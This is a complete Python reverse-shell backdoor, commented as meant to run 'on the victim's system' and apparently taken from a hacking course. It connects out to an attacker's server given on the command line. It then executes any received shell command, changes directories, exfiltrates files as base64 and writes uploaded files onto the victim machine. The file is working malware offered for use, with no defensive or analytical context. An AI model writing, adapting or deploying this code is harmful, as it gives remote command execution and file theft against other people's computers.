#!/usr/bin/env python3
# will be run on the victim's system
import socket,json,base64,shlex,os
import re
import subprocess
import argparse

class Backdoor:
    BUFFER_SIZE = 1024
    def __init__(self,ip,port):
        self.connection = socket.socket(socket.AF_INET,socket.SOCK_STREAM)    
        self.connection.connect((ip,port))
        
    def reliable_receive(self):
        # handle json messages > buffer size
        json_data = b""  # binary
        while True:
            try:
                json_data = json_data + self.connection.recv(Backdoor.BUFFER_SIZE)
                #print('in recv')
                #print(json_data)
                return json.loads(json_data)
            except ValueError:
                continue   
            

    def reliable_send(self,data):    
        json_data = json.dumps(data)
        self.connection.send(json_data.encode())

    def execute_system_command(self,command):
        #try:
        return subprocess.check_output(command,shell=True)  
        #except subprocess.CalledProcessError:
        #    return "error during command execution"
    def change_working_directory_to(self,path):
        os.chdir(path)
        return ("..change working directory to " + path)

    def read_file(self,path):
        with open(path,"rb") as file:
            return base64.b64encode(file.read()) #binary and convert to base64

    def write_file(self,path,content):
        with open(path,"wb") as file:
            file.write(base64.b64decode(content))
            return("..Upload Succesful")


    def run(self):
        while True:
            try:
                command = self.reliable_receive()
                print(command)
                if command[0] == 'exit':
                    self.connection.close()
                    exit()
                elif command[0] =='cd' and len(command) > 1:
                    command_result = self.change_working_directory_to(command[1])
                elif command[0] == "download":
                    command_result = self.read_file(command[1]).decode() # to string
                elif command[0] == "upload":
                    command_result = self.write_file(command[1],command[2])    
                else:
                    command_result = self.execute_system_command(command).decode()
            except Exception:
                command_result = ".. Error during command execution"
            self.reliable_send(command_result)
## end of class            
def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-s","--server",help="ip number of server - eg.  10.0.2.16")
    parser.add_argument("-p","--port",help="port of server - eg.  4444",type=int)
    options= parser.parse_args()
    return options
#main.connect

if __name__ == "__main__":
    options = get_arguments()
    server = options.server
    port = options.port
    print(server + ':' + str(port))
    my_backdoor = Backdoor(server,port)
    my_backdoor.run()
    